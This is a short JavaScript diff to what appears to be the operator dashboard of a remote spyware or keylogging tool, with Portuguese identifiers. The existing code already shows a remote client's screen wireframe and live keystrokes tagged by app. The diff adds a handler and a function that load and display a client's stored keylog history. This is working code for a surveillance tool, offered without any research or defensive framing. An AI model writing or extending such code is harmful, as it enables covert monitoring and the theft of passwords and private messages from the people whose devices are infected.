@@ -198,6 +198,7 @@ function conectar() {
       case 'arvore_tela':        desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
       case 'keylog':             logKey(msg.texto, msg.app || '?'); break;
       case 'resposta_cliente':   receberRespostaCliente(msg.texto); break;
+      case 'keylog_historico':    carregarHistoricoKeys(msg.keylog); break;
       case 'cliente_offline':    log('Cliente ficou offline', 'warn'); break;
       case 'cliente_desconectou':log('Cliente desconectou', 'err'); break;
       case 'erro':               log('Erro: ' + msg.msg, 'err'); break;
@@ -420,6 +421,19 @@ function logKey(texto, app) {
   d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
   el.prepend(d);
   if(abaAtual!=='key') document.getElementById('key-badge').style.display='inline';
+}
+
+function carregarHistoricoKeys(keylog) {
+  if(!keylog || !keylog.length) return;
+  const el = document.getElementById('painel-key');
+  el.innerHTML = '';
+  keylog.forEach(k => {
+    const d = document.createElement('div');
+    d.className = 'keylog-entry';
+    const ts = new Date(k.ts).toLocaleTimeString('pt-BR');
+    d.innerHTML = `<span class="app">${ts} — ${k.app}</span>${k.texto}`;
+    el.appendChild(d);
+  });
 }
 
 function setBadge(on) {
